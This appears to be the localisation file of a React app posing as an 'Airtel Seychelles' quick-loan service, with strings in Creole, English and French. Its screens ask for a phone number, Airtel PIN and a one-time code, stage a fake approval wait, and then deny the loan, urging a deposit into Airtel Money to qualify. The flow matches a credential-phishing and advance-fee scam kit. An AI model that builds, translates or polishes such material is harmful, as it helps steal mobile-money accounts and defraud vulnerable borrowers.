// src/LanguageContext.tsx
import React, { createContext, useContext, useState, useEffect, ReactNode } from 'react';

type Language = 'cr' | 'en' | 'fr';

interface LanguageContextType {
  language: Language;
  setLanguage: (lang: Language) => void;
  t: (key: string) => string;
}

const LanguageContext = createContext<LanguageContextType | undefined>(undefined);

const translations: Record<Language, Record<string, string>> = {
  cr: {
    // Global
    brandTitle: 'Airtel Sesel',
    brandSubtitle: 'Pre rapid. Nenport ler. Nenport kote.',
    secureText: 'Ou bann informasyon i an sekirite.',
    approvalSpinner: 'Aprobasyon an kour...',
    invalidCredentials: 'Kredans pa valid',
    networkError: 'Errer rezo. Tanpri esey ankor.',
    
    // Login
    welcomeBack: 'Byenveni',
    loginSubtitle: 'Konekte ar ou kont Airtel Sesel',
    phoneNumber: 'Nimero telefon',
    enterPin: 'Antre ou koud PIN Airtel',
    loginBtn: 'Konekte',
    
    // OTP Page
    otpTitle: 'Verifikasyon OTP',
    otpSubtitle: 'Antre OTP ki finn ganny voye kot ou nimero telefon',
    otpWaitingSub: 'Nou finn voye ou demann. Tanpri atann pandan nou pe verifie ou bann detay...',
    enterOtp: 'Antre OTP 4 sif',
    otpExpires: 'Koud i ekspire dan',
    submitBtn: 'SOUMET',
    seconds: 'segonn',
    
    // Loan Limit
    loanLimit: 'Ou Limit Pre',
    dragSlider: 'Gliise pou swazir ou montan',
    availableAmount: 'Montan Pre Disponib',
    loanTerm: 'Dire Pre',
    interestRate: 'To Entere',
    processingFee: 'Fre Dossier',
    monthlyPayment: 'Peman sak Mwa',
    continueLoan: 'Kontinie pou Ganny Pre',
    months: 'mwa',

    // Denied Page
    loanDenied: 'Pre Refize!',
    deniedSubtitle: 'Ou demann pou en pre de',
    deniedReason: 'finn ganny refize akoz ou kont pa annan ase aktivite.',
    inactiveMoney: 'Airtel Money Inaktif',
    depositAmount: 'Tanpri depoze omwen',
    depositSub: 'dan ou kont Airtel Money pou aktive li e pou ou kapab demann enn nouvo pre.',
    noFundsDeducted: 'Pa annan okenn larzan ki finn retire dan ou kont.',
    applyAgain: 'Ou kapab aplik pou pre ankour touswit apre ou finn depoze',
    returnDashboard: 'Retounen kot Tablo de Bord',
    backToLogin: 'Retounen pou Konekte'
  },
  en: {
    brandTitle: 'Airtel Seychelles',
    brandSubtitle: 'Fast loans. Anytime. Anywhere.',
    secureText: 'Your information is secure.',
    approvalSpinner: 'Approval in progress...',
    invalidCredentials: 'Invalid credentials',
    networkError: 'Network error. Please try again.',

    welcomeBack: 'Welcome back',
    loginSubtitle: 'Log in to your Airtel Seychelles account',
    phoneNumber: 'Phone number',
    enterPin: 'Enter your Airtel PIN code',
    loginBtn: 'Login',
    
    otpTitle: 'OTP Verification',
    otpSubtitle: 'Enter the OTP sent to your phone number',
    otpWaitingSub: 'Your request has been sent. Please wait while we verify your details...',
    enterOtp: 'Enter 4-digit OTP',
    otpExpires: 'Code expires in',
    submitBtn: 'SUBMIT',
    seconds: 'seconds',

    loanLimit: 'Your Loan Limit',
    dragSlider: 'Drag the slider to choose your amount',
    availableAmount: 'Available Loan Amount',
    loanTerm: 'Loan Term',
    interestRate: 'Interest Rate',
    processingFee: 'Processing Fee',
    monthlyPayment: 'Monthly Repayment',
    continueLoan: 'Continue to Get Loan',
    months: 'months',

    loanDenied: 'Loan Denied!',
    deniedSubtitle: 'Your application for a loan of',
    deniedReason: 'has been denied due to insufficient account activity.',
    inactiveMoney: 'Inactive Airtel Money',
    depositAmount: 'Please deposit at least',
    depositSub: 'to your Airtel Money account to activate it and qualify for a new loan.',
    noFundsDeducted: 'No funds have been deducted from your account.',
    applyAgain: 'You can apply for the loan again immediately after depositing',
    returnDashboard: 'Return to Dashboard',
    backToLogin: 'Back to Login'
  },
  fr: {
    brandTitle: 'Airtel Seychelles',
    brandSubtitle: 'Prêts rapides. À tout moment. N\'importe où.',
    secureText: 'Vos informations sont sécurisées.',
    approvalSpinner: 'Approbation en cours...',
    invalidCredentials: 'Identifiants invalides',
    networkError: 'Erreur réseau. Veuillez réessayer.',

    welcomeBack: 'Bon retour',
    loginSubtitle: 'Connectez-vous à votre compte Airtel Seychelles',
    phoneNumber: 'Numéro de téléphone',
    enterPin: 'Entrez votre code PIN Airtel',
    loginBtn: 'Connexion',
    
    otpTitle: 'Vérification OTP',
    otpSubtitle: 'Entrez l\'OTP envoyé à votre numéro',
    otpWaitingSub: 'Votre demande a été envoyée. Veuillez patienter pendant la vérification...',
    enterOtp: 'Entrez l\'OTP à 4 chiffres',
    otpExpires: 'Le code expire dans',
    submitBtn: 'SOUMETTRE',
    seconds: 'secondes',

    loanLimit: 'Votre limite de prêt',
    dragSlider: 'Faites glisser pour choisir votre montant',
    availableAmount: 'Montant du prêt disponible',
    loanTerm: 'Durée du prêt',
    interestRate: 'Taux d\'intérêt',
    processingFee: 'Frais de dossier',
    monthlyPayment: 'Paiement mensuel',
    continueLoan: 'Continuer pour obtenir le prêt',
    months: 'mois',

    loanDenied: 'Prêt refusé !',
    deniedSubtitle: 'Votre demande de prêt de',
    deniedReason: 'a été refusée en raison d\'une activité insuffisante sur votre compte.',
    inactiveMoney: 'Airtel Money inactif',
    depositAmount: 'Veuillez déposer au moins',
    depositSub: 'sur votre compte Airtel Money pour l\'activer et être éligible à un nouveau prêt.',
    noFundsDeducted: 'Aucun fonds n\'a été déduit de votre compte.',
    applyAgain: 'Vous pouvez postuler à nouveau immédiatement après avoir déposé',
    returnDashboard: 'Retour au tableau de bord',
    backToLogin: 'Retour à la connexion'
  }
};

export const LanguageProvider = ({ children }: { children: ReactNode }) => {
  const [language, setLanguageState] = useState<Language>('cr'); 

  useEffect(() => {
    const savedLang = localStorage.getItem('appLanguage') as Language;
    if (savedLang && ['cr', 'en', 'fr'].includes(savedLang)) {
      setLanguageState(savedLang);
    }
  }, []);

  const setLanguage = (lang: Language) => {
    setLanguageState(lang);
    localStorage.setItem('appLanguage', lang);
  };

  const t = (key: string) => {
    return translations[language][key] || key;
  };

  return (
    <LanguageContext.Provider value={{ language, setLanguage, t }}>
      {children}
    </LanguageContext.Provider>
  );
};

export const useLanguage = () => {
  const context = useContext(LanguageContext);
  if (!context) throw new Error('useLanguage must be used within LanguageProvider');
  return context;
};